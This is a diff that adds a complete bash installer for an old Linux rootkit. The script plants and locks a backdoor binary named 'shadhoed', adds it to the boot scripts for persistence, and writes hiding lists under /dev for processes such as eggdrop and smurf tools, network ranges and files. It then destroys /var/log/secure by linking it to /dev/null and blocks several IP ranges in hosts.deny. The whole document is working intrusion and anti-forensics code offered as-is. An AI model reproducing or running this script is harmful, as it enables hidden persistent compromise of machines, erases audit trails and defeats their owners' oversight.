@@ -1,0 +1,52 @@
+#!/bin/bash
+chattr -i /bin/login
+chattr +i /bin/login
+cp shadhoed /usr/sbin
+chmod +x /usr/sbin/shadhoed
+chattr +i /usr/sbin/shadhoed
+echo "/usr/sbin/shadhoed" >>/etc/rc.d/rc.sysinit
+touch /dev/hdcc
+echo "shadow" >>/dev/hdcc
+echo "/dev/hdaa" >>/dev/hdcc
+echo "/dev/hdbb" >>/dev/hdcc
+echo "/dev/hdcc" >>/dev/hdcc
+echo "/dev/hddd" >>/dev/hdcc
+echo "/usr/sbin/shadhoed" >>/dev/hdcc
+echo "making yer connection stealth"
+rm -rf /dev/hdbb
+touch /dev/hdbb
+echo "1 206." >>/dev/hdbb
+echo "1 207." >>/dev/hdbb
+echo "1 .pacbell.net" >>/dev/hdbb
+echo "1 .sy.net" >>/dev/hdbb
+echo "1 .cosmoweb.net" >>/dev/hdbb
+echo "1 .eni.net" >>/dev/hdbb
+echo "1 155." >>/dev/hdbb
+echo "2 ." >>/dev/hdbb
+echo "hiding processes"
+touch /dev/hdaa
+echo "3 Bitch" >>/dev/hdaa
+echo "3 strobe" >>/dev/hdaa
+echo "3 smur" >>/dev/hdaa
+echo "3 massi" >>/dev/hdaa
+echo "3 bugdrop" >>/dev/hdaa
+echo "3 botchk" >>/dev/hdaa
+echo "3 eggdrop." >>/dev/hdaa
+echo "3 ip0p" >>/dev/hdaa
+echo "3 shadhoed" >>/dev/hdaa
+echo "3 socd" >>/dev/hdaa
+echo "turning off log0ring"
+touch /dev/hddd
+echo "." >>/dev/hddd
+echo "rshd" >>/dev/hddd
+rm -rf /var/log/secure
+ln -s /dev/null /var/log/secure
+echo "ALL : 166." >>/etc/hosts.deny
+echo "ALL : 129." >>/etc/hosts.deny
+echo "ALL : 38." >>/etc/hosts.deny
+echo "ALL : 152." >>/etc/hosts.deny
+echo "ALL : 153." >>/etc/hosts.deny
+echo "ALL : 205.164" >>/etc/hosts.deny
+echo "ALL : 207.205" >>/etc/hosts.deny
+echo "ALL : 206.80" >>/etc/hosts.deny
+rm -rf root.new
